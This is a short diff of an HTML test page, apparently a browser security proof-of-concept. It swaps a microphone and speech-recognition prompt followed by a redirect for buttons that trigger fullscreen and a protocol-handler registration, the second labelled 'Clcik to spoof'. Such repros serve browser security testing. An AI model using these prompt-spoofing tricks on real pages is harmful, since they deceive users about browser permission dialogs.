@@ -1,13 +1,3 @@
 
-<input onclick="start()" type="button" value="Click here" />
-
-<script>
-  function start(){
-   var recognition = new webkitSpeechRecognition();
-  recognition.start();
-  navigator.webkitGetUserMedia({audio: true}, function(){}, function(){});
-    alert();
-  document.location = "https://www.google.com"
-  }
-
-  </script>
+<input onclick="document.documentElement.webkitRequestFullScreen()" value="Click here" type="button" />
+<input onclick="navigator.registerProtocolHandler('web+', '123%s', 'title');" value="Clcik to spoof" type="button" />
